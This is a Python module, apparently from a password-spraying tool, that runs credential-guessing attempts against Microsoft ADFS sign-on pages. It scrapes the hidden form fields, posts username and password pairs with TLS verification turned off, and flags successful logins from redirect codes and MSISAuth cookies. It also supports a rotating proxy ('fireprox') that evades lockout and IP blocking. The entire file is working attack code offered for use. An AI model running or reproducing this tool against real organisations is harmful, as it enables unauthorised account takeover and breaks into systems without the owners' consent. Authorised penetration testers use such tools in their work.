import requests
import re

from .classes.BaseHttpTarget import BaseHttpTarget


class ADFS(BaseHttpTarget):
    NAME = "ADFS"
    DESCRIPTION = "Spray Microsoft Active Directory Federation Services (ADFS)"

    def __init__(self, host, port, timeout, fireprox):
        self.timeout = timeout
        self.host = host
        self.port = port

        #
        # Build base URL
        #
        if fireprox:
            self.base_url = f"https://{fireprox}/fireprox"
        else:
            self.base_url = f"https://{host}:{port}"

        #
        # Use IdP-initiated sign-on endpoint (simpler, no relying party required)
        #
        self.url = f"{self.base_url}/adfs/ls/IdpInitiatedSignOn.aspx"

        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Content-Type": "application/x-www-form-urlencoded",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
        }

        #
        # Use session for cookie management
        #
        self.session = requests.Session()
        self.session.headers.update(self.headers)

    def set_username(self, username):
        self.username = username

    def set_password(self, password):
        self.password = password

    def _extract_form_fields(self, html):
        """Extract hidden form fields from HTML response."""
        fields = {}

        #
        # Extract hidden input fields
        #
        hidden_pattern = r'<input[^>]+type=["\']hidden["\'][^>]*>'
        hidden_inputs = re.findall(hidden_pattern, html, re.IGNORECASE)

        for hidden in hidden_inputs:
            name_match = re.search(r'name=["\']([^"\']+)["\']', hidden)
            value_match = re.search(r'value=["\']([^"\']*)["\']', hidden)

            if name_match:
                name = name_match.group(1)
                value = value_match.group(1) if value_match else ""
                fields[name] = value

        return fields

    def _get_post_url(self, html):
        """Extract form action URL from HTML response."""
        #
        # Look for form action attribute
        #
        action_match = re.search(r'<form[^>]+action=["\']([^"\']+)["\']', html, re.IGNORECASE)
        if action_match:
            action = action_match.group(1)
            #
            # Handle relative URLs
            #
            if action.startswith('/'):
                return f"{self.base_url}{action}"
            elif not action.startswith('http'):
                return f"{self.base_url}/{action}"
            return action

        #
        # Default to same URL if no action found
        #
        return self.url

    def login(self, username, password):
        #
        # Set credentials
        #
        self.set_username(username)
        self.set_password(password)

        #
        # Create fresh session for each login attempt
        #
        self.session = requests.Session()
        self.session.headers.update(self.headers)

        #
        # Phase 1: GET the login form to obtain hidden fields and cookies
        #
        try:
            get_response = self.session.get(
                self.url,
                timeout=self.timeout,
                verify=False,
                allow_redirects=True
            )
        except Exception:
            #
            # If GET fails, try direct POST (some ADFS configs work this way)
            #
            get_response = None

        #
        # Build form data
        #
        data = {
            "UserName": username,
            "Password": password,
            "AuthMethod": "FormsAuthentication",
        }

        #
        # Extract hidden fields if we got a form
        #
        post_url = self.url
        if get_response and get_response.status_code == 200:
            hidden_fields = self._extract_form_fields(get_response.text)
            data.update(hidden_fields)
            post_url = self._get_post_url(get_response.text)

        #
        # Phase 2: POST credentials
        #
        response = self.session.post(
            post_url,
            data=data,
            timeout=self.timeout,
            verify=False,
            allow_redirects=False  # Don't follow redirects to detect 302
        )

        return response

    def print_response(self, response, outfile, timeout=False, print_to_screen=True):
        """Override to add success detection hints."""
        if timeout:
            code = "TIMEOUT"
            length = "TIMEOUT"
        else:
            code = response.status_code
            length = str(len(response.content))

            #
            # Check for authentication indicators
            # 302 redirect typically indicates successful auth
            # Also check for MSIAuth cookie
            #
            if response.status_code == 302:
                #
                # Check if redirect has auth cookies
                #
                cookies = self.session.cookies.get_dict()
                if 'MSISAuth' in cookies or 'MSISAuthenticated' in cookies:
                    code = "302-AUTH"

        if print_to_screen:
            print("%-35s %-25s %13s %15s" % (self.username, self.password, code, length))

        self.log_attempt(code, length, outfile)
